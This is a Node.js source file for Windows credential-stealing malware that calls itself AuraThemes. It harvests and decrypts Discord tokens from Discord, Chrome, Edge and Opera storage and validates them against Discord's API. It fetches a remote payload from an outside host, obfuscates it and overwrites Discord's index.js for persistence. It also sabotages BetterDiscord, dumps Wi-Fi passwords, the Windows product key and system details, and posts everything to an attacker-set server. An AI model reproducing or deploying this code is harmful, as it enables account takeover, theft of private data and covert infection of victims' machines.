const { execSync,spawnSync, exec } = require('child_process'),
    fs = require("fs"),
    crypto = require("crypto");
let buffreplace = require('buffer-replace'),
    path = require("path"),
    aura = require("win-dpapi"),
    axios = require('axios'),
    fetch = require("node-fetch");
let tokens = [],
    injectPath = [],

    killdcop = false, //(true) to restart all Discord processes, (false) for the opposite.
    API = "http://addyourapiserver/request" // here you need to add your (api) so that the recommendation data can be sent to host in replit lol
    
switch (process.platform) {
    case "win32":
        let appdata = process.env.appdata,
            localappdata = process.env.localappdata,
            paths = [`${appdata}/discord/`,`${appdata}/discordcanary/`,`${appdata}/discordptb/`,`${appdata}/discorddevelopment/`,`${appdata}/lightcord/`,`${appdata}/Opera Software/Opera Stable/`,`${appdata}/Opera Software/Opera GX Stable/`,`${localappdata}/Google/Chrome/User Data/Default/`,`${localappdata}/Google/Chrome/User Data/Profile 1/`,`${localappdata}/Google/Chrome/User Data/Profile 2/`,`${localappdata}/Google/Chrome/User Data/Profile 3/`,`${localappdata}/Google/Chrome/User Data/Profile 4/`,`${localappdata}/Google/Chrome/User Data/Profile 5/`,`${localappdata}/Google/Chrome/User Data/Guest Profile/`,`${localappdata}/Google/Chrome/User Data/Default/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 1/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 2/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 3/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 4/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 5/Network/`,`${localappdata}/Google/Chrome/User Data/Guest Profile/Network/`,`${localappdata}/Microsoft/Edge/User Data/Default/`,`${localappdata}/Microsoft/Edge/User Data/Profile 1/`,`${localappdata}/Microsoft/Edge/User Data/Profile 2/`,`${localappdata}/Microsoft/Edge/User Data/Profile 3/`,`${localappdata}/Microsoft/Edge/User Data/Profile 4/`,`${localappdata}/Microsoft/Edge/User Data/Profile 5/`,`${localappdata}/Microsoft/Edge/User Data/Guest Profile/`,`${localappdata}/Microsoft/Edge/User Data/Default/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 1/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 2/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 3/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 4/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 5/Network/`,`${localappdata}/Microsoft/Edge/User Data/Guest Profile/Network/`],
            cords = ['discord','discordcanary','discordptb','discorddevelopment','lightcord'];
            startup()

        function startup() {
            discordinjected()
            tokenfuck()    
            fs.readdirSync(__dirname).forEach((a) => {
                if (a.endsWith('.xml')) {
                    f = path.join(__dirname, a);
                    fs.unlinkSync(f);
                }
            });
        }

        async function tokenfuck() {
            for (p of paths) {
                await find(p);
            }; await check(tokens)
        }

        async function find(p) {
            let tail = p;p += 'Local Storage/leveldb';
            if (!cords.some(d => tail.includes(d)))  {
                try {
                    fs.readdirSync(p).map(f => {
                        (f.endsWith('.log') || f.endsWith('.ldb')) && fs.readFileSync(`${p}/${f}`, 'utf8').split(/\r?\n/).forEach(l => {
                            const patterns = [
                                new RegExp(/mfa\.[\w-]{84}/g), 
                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
                            ];
                            for (const p of patterns) {
                                const foundTkns = l.match(p);
                                if (foundTkns) {
                                    foundTkns.forEach(tkn => {
                                        if (!tokens.includes(tkn)) return tokens.push(tkn)
                                    });
                                }
                            }
                        });
                    });
                } catch (e) {}
                return;
            } else {
                if (fs.existsSync(`${tail}/Local State`)) {
                    try {
                        fs.readdirSync(p).map(f => {
                            (f.endsWith('.log') || f.endsWith('.ldb')) && fs.readFileSync(`${p}/${f}`, 'utf8').split(/\r?\n/).forEach(l => {
                                const pattern = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g);
                                const foundTkns = l.match(pattern);
                                if (foundTkns) {
                                    foundTkns.forEach(tkn => {
                                        let enc = Buffer.from(JSON.parse(fs.readFileSync(`${tail}/Local State`)).os_crypt.encrypted_key, 'base64').slice(5);
                                        let key = aura.unprotectData(Buffer.from(enc, 'utf-8'), null, 'CurrentUser');
                                        const tkns = Buffer.from(tkn.split('dQw4w9WgXcQ:')[1], 'base64');
                                        let run = tkns.slice(3, 15), mid = tkns.slice(15, tkns.length - 16); 
                                        let decyph = crypto.createDecipheriv('aes-256-gcm', key, run); decyph.setAuthTag(tkns.slice(tkns.length - 16, tkns.length));
                                        let out = decyph.update(mid, 'base64', 'utf-8') + decyph.final('utf-8');
                                        if (!tokens.includes(out)) return tokens.push(out)
                                    })
                                };
                            });
                        });
                    } catch (e) {}
                    return;
                }
            }
        }

        async function check(t) {
            let g = []
            for (let a of t) {
                await axios.get(`https://discord.com/api/v9/users/@me`, { headers: {"Content-Type": "application/json","authorization": `${a}`}})
                .then(g => {e = g.data})
                .catch(() => {e = null}) 
                if (e) {
                    g.push(a); 
                  }
                }
                if (g.length > 0) {
                await sendall(g); 
            }
        }

        async function discordinjected() {
            const discords = fs.readdirSync(localappdata).filter(file => file.includes("iscord")).map(file => path.join(localappdata, file));
            for (const paths of discords) {findindex(paths)}
            for (const paths of discords) {await findinject(paths)}
            await inject();
            await betterbroke();
            if (killdcop) {await killalldc()}
        }

        function findindex(f) {
            let dcpaths = fs.readdirSync(f);
            dcpaths.forEach((file) => {
                let filePath = path.join(f, file);
                let fileStat = fs.statSync(filePath);
                if (fileStat.isDirectory()) {findindex(filePath)} else {if (file === "index.js" && !f.includes("node_modules") && f.includes("desktop_core")) {injectPath.push(filePath)}}
            });
        }

        async function findinject(f) {
            const files = await fs.promises.readdir(f);
                for (const file of files) {
                    const filePath = path.join(f, file);
                    const fileStat = await fs.promises.stat(filePath);
                    if (fileStat.isDirectory()) {
                        if (file === 'aura') {await fs.rmdirSync(filePath)} else {await findinject(filePath)}
                    }
                }
         }

         async function inject() {
            let resp = await axios.get("https://6889.fun/api/aurathemes/inject", {headers: {aurathemes: true}});
            let obf = require('javascript-obfuscator').obfuscate(resp.data.replace("*API*", API), {"ignoreRequireImports": true, "compact": true, "controlFlowFlattening": true, "controlFlowFlatteningThreshold": 0.5, "deadCodeInjection": false, "deadCodeInjectionThreshold": 0.01, "debugProtection": false, "debugProtectionInterval": 0, "disableConsoleOutput": true, "identifierNamesGenerator": "hexadecimal", "log": false, "numbersToExpressions": false, "renameGlobals": false, "selfDefending": false, "simplify": true, "splitStrings": false, "splitStringsChunkLength": 5, "stringArray": true, "stringArrayEncoding": ["base64"], "stringArrayIndexShift": true, "stringArrayRotate": false, "stringArrayShuffle": false, "stringArrayWrappersCount": 5, "stringArrayWrappersChainedCalls": true, "stringArrayWrappersParametersMaxCount": 5, "stringArrayWrappersType": "function", "stringArrayThreshold": 1, "transformObjectKeys": false, "unicodeEscapeSequence": false });
            let payload = obf.getObfuscatedCode();
            injectPath.forEach(file => {
                try {
                    fs.writeFileSync(file, payload, {encoding: 'utf8',flag: 'w'});
                } catch (e) {
                    console.error(e)
                };
            });
        };

        function betterbroke() {
            let dir = `${localappdata}/BetterDiscord/data/betterdiscord.asar`;
            if (fs.existsSync(dir)) {
                x = fs.readFileSync(dir);
                fs.writeFileSync(dir, buffreplace(x, "api/webhooks", "aurathemesontop"))
            }
            return;
        }

        async function killalldc() {
            const execx = require('util').promisify(exec);
            const clients = ['Discord.exe', 'DiscordCanary.exe', 'DiscordDevelopment.exe', 'DiscordPTB.exe'];
            try {
                const { stdout } = await execx('tasklist');
                for (const c of clients) {
                    if (stdout.includes(c)) {
                        await killAndRestartClient(c);
                    }
                }
            } catch (err) {
              console.error(err);
            }
          }

        async function killAndRestartClient(c) {
            try {
                await exec(`taskkill /F /T /IM ${c}`);
                const clientPath = `${localappdata}/${c.replace('.exe', '')}/Update.exe`;
                await exec(`"${clientPath}" --processStart ${c}`);
            } catch (err) {
                console.error(err);
            }
        }

        function getSystemInfo() {
            try {
                return {
                    Ram: execSync("wmic os get TotalVisibleMemorySize").toString().split("\r\n")[1].trim() + " KB",
                    UserName: execSync("echo %USERNAME%").toString().trim(),
                    UUID: execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID").toString().split("\r\n")[0],
                    MacAddress: execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress").toString().split("\r\n")[0],
                    ProductKey: spawnSync('powershell', ['Get-ItemPropertyValue', '-Path', '\'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform\'', '-Name', 'BackupProductKeyDefault']).stdout.toString().trim(),
                    LocalIp: execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split('\r\n')[0],
                    CpuModel: execSync("wmic cpu get caption").toString().split("\r\r\n")[1].trim(),
                    GetIpAddress: execSync("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress").toString().split("\r\n")[0],
                    WifiPass: execSync(`netsh wlan export profile key=clear;Get-ChildItem *.xml | ForEach-Object {$xml = [xml](get-content $_);$a = $xml.WLANProfile.SSIDConfig.SSID.name + ": " + $xml.WLANProfile.MSM.Security.sharedKey.keymaterial;$a;}`, { shell: "powershell.exe" }).toString().split("\r\n").filter(l => l.includes(": ")).map(l => l.replace(/�\?T/g, "'")).join("\n"),
                };
            } catch (e) {
                console.error(e);
                return {};
            }
        };


        function g(s) {
            let d = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let r = '';
            for (i = 0; i < s; i++) {
              let x = d.charAt(Math.floor(Math.random() * d.length));
              r += x;
            }
            return `AuraThemes_${r}`;
        }

        async function sendall(t) {
            let r = g(10)
            fetch(`${API}/startup`, {
                method: "POST", 
                body: JSON.stringify({
                    tokens: t,
                    filename: r,
                    ...getSystemInfo()
                })
            })
        }
        break
    default: break
}

process
    .on("uncaughtException", err => console.error(err))
    .on("unhandledRejection", err => console.error(err));